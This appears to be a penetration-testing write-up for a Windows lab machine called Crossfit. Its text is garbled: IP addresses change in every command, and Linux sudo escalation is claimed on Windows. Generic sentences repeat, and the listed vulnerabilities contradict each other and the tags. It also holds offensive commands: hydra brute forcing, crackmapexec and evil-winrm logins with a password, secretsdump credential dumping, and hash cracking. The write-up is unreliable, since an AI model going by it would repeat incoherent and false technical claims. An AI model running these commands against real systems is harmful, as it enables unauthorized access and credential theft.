---
TitleSEO: "OffSec Proving Grounds — Crossfit (Medium Windows) | ZureFX"
TitlePost: "OffSec Proving Grounds — Crossfit (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Crossfit. GPP Password and Path Traversal to achieve medium compromise on Windows."
Keywords: "pwntilldawn, active directory, tryhackme, offsec, linux, insane"
URL: "https://zurefx.github.io/writeups/htb-crossfit-212.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-crossfit-212/"
Date: "2025-08-13"
Tags: "PwnTillDawn, Active Directory, TryHackMe, OffSec, Linux, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-crossfit-212"
Permalink: "/writeups/htb-crossfit-212.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Crossfit** is rated **Medium** on OffSec Proving Grounds. It runs **Windows** and the IP address during this analysis was `10.29.231.142`.

### Objectives

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.61.130.128/FUZZ
feroxbuster -h
evil-winrm -i 10.84.67.93 -u administrator -p 'P@ssw0rd!'
```

Authentication bypass was achieved through careful manipulation of the login mechanism. The application stored sensitive credentials in an unencrypted configuration file.

### Service Enumeration

The kernel version was outdated and vulnerable to a publicly known exploit. The target system was identified as running a vulnerable version of the service. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
gobuster dir -u http://10.93.87.51/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.13.107.205 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.53.146.116 -u administrator -p 'P@ssw0rd!' --shares
```

The application stored sensitive credentials in an unencrypted configuration file. The kernel version was outdated and vulnerable to a publicly known exploit.

### SMB Enumeration

Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.200.185/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target. The target system was identified as running a vulnerable version of the service.

Key finding: **Insecure Deserialization**.

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

### Initial Access

Command injection was possible through unsanitized user input in the search functionality. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.23.46.57/FUZZ
nmap -sCV -p8443,5986,3389 10.65.134.86 -oN scan.txt
```

The backup files contained sensitive information that should not have been accessible. Group Policy Preferences contained encrypted but recoverable credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p587,27017,464 10.62.138.129 -oN scan.txt
```

### Exploitation

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.150.222
evil-winrm -i 10.83.246.220 -u administrator -p 'P@ssw0rd!'
```

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Token impersonation allowed elevation to SYSTEM privileges on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Summary

### Tools Used

- `evil-winrm`
- `metasploit`
- `msfvenom`
- `secretsdump`
- `lookupsid`

### Key Takeaways

- GPP Password
- Path Traversal
- Insecure Deserialization
